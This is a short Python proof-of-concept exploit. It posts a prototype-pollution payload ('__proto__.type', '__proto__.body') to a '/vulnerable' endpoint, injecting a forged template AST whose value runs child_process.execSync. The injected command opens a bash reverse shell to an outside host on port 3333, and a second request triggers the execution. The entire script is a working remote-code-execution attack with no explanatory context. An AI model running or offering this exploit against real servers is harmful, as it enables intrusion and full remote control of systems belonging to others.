import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
   "__proto__.type": "Program",
   "__proto__.body": [{
       "type": "MustacheStatement",
       "path": 0,
       "params": [{
           "type": "NumberLiteral",
           "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
       }],
       "loc": {
           "start": 0,
           "end": 0
       }
   }]
})

# execute
requests.get(TARGET_URL)
